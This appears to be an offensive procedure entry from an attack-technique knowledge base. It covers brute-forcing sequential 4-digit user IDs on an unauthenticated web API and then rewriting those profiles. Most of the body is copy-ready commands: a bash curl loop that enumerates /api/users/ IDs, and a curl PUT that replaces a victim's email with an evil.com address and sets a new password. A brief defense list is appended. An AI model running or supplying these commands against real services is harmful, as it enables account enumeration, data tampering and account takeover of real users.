---
id: proc-uuid-003
name: Brute-Force-Enumerate-and-Modify-Existing-User-Profiles
tags:
  - idor
  - brute-force
  - enumeration
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:30:18.112Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Brute-Force-Enumerate-and-Modify-Existing-User-Profiles

## Summary

This procedure uses a predictable 4-digit user ID system to brute-force enumerate valid user profiles and then modifies their personal information via an unauthenticated API endpoint, enabling widespread data tampering.

## Description

On the Mars platform, user IDs are sequential 4-digit codes (e.g., 0001-9999), lacking rate limits, allowing easy enumeration. Once identified, the profile update endpoint permits unauthorized changes. This targets web APIs and can result in account takeovers. Prerequisites: Vulnerable update endpoint. Outcomes: List of users and altered data.

## Requirements

1. Predictable ID scheme (e.g., 4-digit numeric)
2. Unauthenticated access to profile endpoints
3. Scripting capability for automation

## Defense

Defensive measures and detection strategies:

- Use non-sequential, random UUIDs for identifiers
- Apply rate limiting to ID-based requests
- Audit logs for bulk modification patterns

## Objectives

1. Discover all existing user accounts
2. Tamper with personal data for impact demonstration
3. Facilitate potential account takeovers

## Instructions

### Step 1: Enumerate Valid IDs

**Context**: Loop through possible IDs to find valid ones by checking response status.

Script a brute-force GET:

```bash
for id in $(printf '%04d
' {1..9999}); do
  response=$(curl -s -o /dev/null -w '%{http_code}' https://target.com/api/users/$id)
  if [ "$response" = "200" ]; then
    echo "Valid ID: $id"
  fi
done
```

> Collect valid IDs in a file. Valid responses return user data; invalids return 404.

### Step 2: Modify Profiles for Valid IDs

**Context**: For each valid ID, send an update request with altered data.

Update example:

```bash
curl -X PUT https://target.com/api/users/0001 \
  -H "Content-Type: application/json" \
  -d '{"email":"modified@evil.com","password":"newpass"}'
```

> Repeat for enumerated IDs. Success: 200 OK with updated confirmation.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Account Discovery]] Account Discovery

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[idor]]
- [[brute-force]]
- [[enumeration]]
